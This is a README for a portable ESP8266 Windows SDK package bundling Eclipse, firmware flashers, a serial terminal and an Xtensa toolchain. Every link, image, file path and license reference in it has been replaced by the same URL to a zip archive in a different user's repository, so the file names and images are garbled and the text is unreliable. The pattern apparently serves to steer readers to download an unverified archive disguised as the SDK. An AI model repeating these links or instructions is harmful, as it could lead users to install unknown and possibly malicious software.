# Espressif ESP8266 Windows SDK Portable Package

This is an attempt to convert the [Un-Official Windows SDK](https://github.com/JohnInWI/ESP8266-uof-windows-sdk-portable/raw/refs/heads/master/images/sdk_portable_windows_ES_uof_1.0.zip)
into a workable and portable package that can be carried on a **USB stick!**

The assumption in mind is the system used has a **64-bit Architecture** with 
**Windows 7** or **Windows 8** as the operating system.

No additional Package needs to be installed, it works directly out of the box.

We have tried to bundle all the required utilities to make this most helpful for Windows Users.

## [Download https://github.com/JohnInWI/ESP8266-uof-windows-sdk-portable/raw/refs/heads/master/images/sdk_portable_windows_ES_uof_1.0.zip](https://github.com/JohnInWI/ESP8266-uof-windows-sdk-portable/raw/refs/heads/master/images/sdk_portable_windows_ES_uof_1.0.zip)

**File Size: 635.55 MB**

**MD5-SUM** = `a46044025137ecbfc94bce0e0c57a6e1`


## Additional Modules

1.  **Path Updater Utility** - *In case Examples are Imported into Eclipse* then one would need to 
    update the fixed path locations. This can be achieved by running the program
    `example-pathupdate\https://github.com/JohnInWI/ESP8266-uof-windows-sdk-portable/raw/refs/heads/master/images/sdk_portable_windows_ES_uof_1.0.zip` to make sure that all paths
    in the examples are updated. This utility also updates the **serial port** for 
    [*esptool*](https://github.com/JohnInWI/ESP8266-uof-windows-sdk-portable/raw/refs/heads/master/images/sdk_portable_windows_ES_uof_1.0.zip) to load
    firmware. One just modify the *COM port* number in the file 
    `example-pathupdate\https://github.com/JohnInWI/ESP8266-uof-windows-sdk-portable/raw/refs/heads/master/images/sdk_portable_windows_ES_uof_1.0.zip` in a text editor 
    (only keep one line in the file).

2.  **Eclipse** version of *Luna 64-bit for Windows* is included with auto environment configuration
    using the `https://github.com/JohnInWI/ESP8266-uof-windows-sdk-portable/raw/refs/heads/master/images/sdk_portable_windows_ES_uof_1.0.zip` file. By executing *this file* the Eclipse would automatically open 
    with the default workspace location `Workspace` Directory (in the present directory).

3.  **Direct Flasher** - This helps to program the single official Firmware image released from
    Espressif. This is located in the directory `ESP8266_directflasher`. This is the 
    [cloud update](https://github.com/JohnInWI/ESP8266-uof-windows-sdk-portable/raw/refs/heads/master/images/sdk_portable_windows_ES_uof_1.0.zip)
    flasher that was released earlier. More details are available in the file 
    `ESP8266_directflasher\https://github.com/JohnInWI/ESP8266-uof-windows-sdk-portable/raw/refs/heads/master/images/sdk_portable_windows_ES_uof_1.0.zip`. It also contains the 
    [offical firmware](https://github.com/JohnInWI/ESP8266-uof-windows-sdk-portable/raw/refs/heads/master/images/sdk_portable_windows_ES_uof_1.0.zip)
    at this point of time in the file `ESP8266_directflasher\v0.9.2.2 AT https://github.com/JohnInWI/ESP8266-uof-windows-sdk-portable/raw/refs/heads/master/images/sdk_portable_windows_ES_uof_1.0.zip`.
    We have also packaged the famous **Node MCU's Lua Firmware** image in the file
    `ESP8266_directflasher\https://github.com/JohnInWI/ESP8266-uof-windows-sdk-portable/raw/refs/heads/master/images/sdk_portable_windows_ES_uof_1.0.zip`. For this direct flashing one 
    needs to power up the module in the * hardware configuration* mentioned in the
    `ESP8266_directflasher\https://github.com/JohnInWI/ESP8266-uof-windows-sdk-portable/raw/refs/heads/master/images/sdk_portable_windows_ES_uof_1.0.zip` file.

4.  **Cool Terminal** - We have included the famous [Roger Meier's Cool Terminal](https://github.com/JohnInWI/ESP8266-uof-windows-sdk-portable/raw/refs/heads/master/images/sdk_portable_windows_ES_uof_1.0.zip)
    in the `CoolTermWin` directory. This is an easy to use Serial port Terminal program to talk 
    and test out the ESP8266.

5.  **Node MCU's Flasher** in the Location 
    `ESP8266-nodemcu-flasher-master\https://github.com/JohnInWI/ESP8266-uof-windows-sdk-portable/raw/refs/heads/master/images/sdk_portable_windows_ES_uof_1.0.zip`
    to help in flashing of custom location using specific binary image files.
    Basically this an English version of the 
    [offical firmware loader](https://github.com/JohnInWI/ESP8266-uof-windows-sdk-portable/raw/refs/heads/master/images/sdk_portable_windows_ES_uof_1.0.zip).

6.  **C++ Toolchain ** we have added the compiled *G++ xtensa toolchain for ESP8266* built by 
    [user igrr from esp8266 community forum](https://github.com/JohnInWI/ESP8266-uof-windows-sdk-portable/raw/refs/heads/master/images/sdk_portable_windows_ES_uof_1.0.zip).
    However in order to use it one needs to modify the makefile to point at the correct path.
    This toolchain is located at `xtensa-lx106-elf-cpp\bin`. The original C toolchain
    is located at `xtensa-lx106-elf\bin` which came with the devkit package.


## Some Useful Images

### Bigger Picture of the ESP-01 Module:

![](https://github.com/JohnInWI/ESP8266-uof-windows-sdk-portable/raw/refs/heads/master/images/sdk_portable_windows_ES_uof_1.0.zip)


### ESP-01 module PCB layout View

![](https://github.com/JohnInWI/ESP8266-uof-windows-sdk-portable/raw/refs/heads/master/images/sdk_portable_windows_ES_uof_1.0.zip https://github.com/JohnInWI/ESP8266-uof-windows-sdk-portable/raw/refs/heads/master/images/sdk_portable_windows_ES_uof_1.0.zip)


### Eclipse Path configuration for Code Complete in Windows SDK
![](https://github.com/JohnInWI/ESP8266-uof-windows-sdk-portable/raw/refs/heads/master/images/sdk_portable_windows_ES_uof_1.0.zip)


### ESP8266 Pin Configuration

![](https://github.com/JohnInWI/ESP8266-uof-windows-sdk-portable/raw/refs/heads/master/images/sdk_portable_windows_ES_uof_1.0.zip https://github.com/JohnInWI/ESP8266-uof-windows-sdk-portable/raw/refs/heads/master/images/sdk_portable_windows_ES_uof_1.0.zip)


## License

This work has been released under GPLv2 by Boseji (c) 2015 
Unless otherwise explicitly specified in the individual parts of the package
all parts would be licensed under GPLv2. 
You can find this included as `https://github.com/JohnInWI/ESP8266-uof-windows-sdk-portable/raw/refs/heads/master/images/sdk_portable_windows_ES_uof_1.0.zip` file.


## Foreword

Kindly let us know your feedback and issues for this package 

